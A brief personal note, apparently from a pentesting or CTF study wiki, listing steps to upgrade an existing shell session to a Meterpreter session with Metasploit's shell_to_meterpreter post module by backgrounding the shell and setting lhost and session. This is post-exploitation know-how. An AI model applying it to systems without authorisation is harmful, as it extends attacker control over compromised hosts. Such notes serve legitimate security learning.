---
title: "shellToMeterpreter"
tags:
  - fetus
---
1. background the shell (type `background` and press enter and do `y` to confirm)
2. use this module:
```sh
use post/multi/manage/shell_to_meterpreter
```
3. set the `lhost` and `session` id (check session id of running sessions by doing `sessions` in msf)
4. run it. boom you got a meterpreter shell 